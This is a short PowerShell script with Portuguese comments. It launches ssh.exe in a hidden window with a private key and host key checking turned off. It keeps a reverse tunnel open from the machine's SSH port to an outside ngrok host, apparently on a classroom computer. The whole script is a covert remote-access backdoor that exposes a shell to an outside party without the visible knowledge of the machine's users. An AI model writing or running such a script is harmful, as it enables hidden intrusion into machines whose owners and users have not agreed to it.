# Caminho do SSH
$sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"

# Caminho da chave privada
$keyPath = "C:\Users\SALA 1 ANO B\.ssh\ssh_key"

# Executa SSH em segundo plano invisível
Start-Process -FilePath $sshPath -ArgumentList `
    "-i", "$keyPath", `
    "-o", "StrictHostKeyChecking=no", `
    "-o", "ServerAliveInterval=60", `
    "-o", "ServerAliveCountMax=3", `
    "-o", "ExitOnForwardFailure=yes", `
    "-R", "2222:localhost:22", `
    "u0_a416@0.tcp.sa.ngrok.io", `
    "-p", "11353", `
    "-N" `
    -WindowStyle Hidden
